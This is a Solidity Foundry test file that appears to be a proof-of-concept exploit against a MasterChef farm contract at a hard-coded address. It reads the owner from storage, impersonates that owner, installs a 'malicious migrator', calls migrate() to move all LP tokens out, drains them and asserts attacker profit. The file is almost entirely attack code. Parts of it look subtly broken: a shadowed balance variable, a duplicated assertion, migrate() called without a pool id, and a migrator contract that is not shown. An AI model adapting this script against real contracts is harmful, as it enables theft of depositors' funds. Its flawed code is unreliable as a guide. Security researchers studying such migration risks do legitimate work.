contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x4B6c8959a41475347226d51f37eC9a1E09F39a92;
    address attacker = address(this);
    MaliciousMigrator public maliciousMigrator;
    uint256 public initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy malicious migrator contract
        maliciousMigrator = new MaliciousMigrator(attacker);

        // Get initial attacker balance
        initialBalance = address(this).balance;

        // Label contracts for debugging
        vm.label(TARGET, "Inspex-Farm MasterChef");
        vm.label(address(maliciousMigrator), "Malicious Migrator");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate the owner of the MasterChef contract
        // First, we need to find out who the owner is - typically stored in slot 0
        address owner = address(uint160(uint256(vm.load(TARGET, bytes32(uint256(0))))));
        vm.label(owner, "Contract Owner");

        // Step 2: Start pranking as the owner
        vm.startPrank(owner);

        // Step 3: Set the malicious migrator
        IMasterChef(TARGET).setMigrator(address(maliciousMigrator));

        // Step 4: Stop pranking
        vm.stopPrank();

        // Step 5: Call migrate to trigger the token transfer
        // This will transfer all LP tokens to our malicious migrator
        IMasterChef(TARGET).migrate();

        // Step 6: The malicious migrator should have automatically forwarded tokens
        // Check if we need to manually drain from migrator
        maliciousMigrator.drain();

        // Step 7: Verify profit
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    receive() external payable {}

    fallback() external payable {}
}

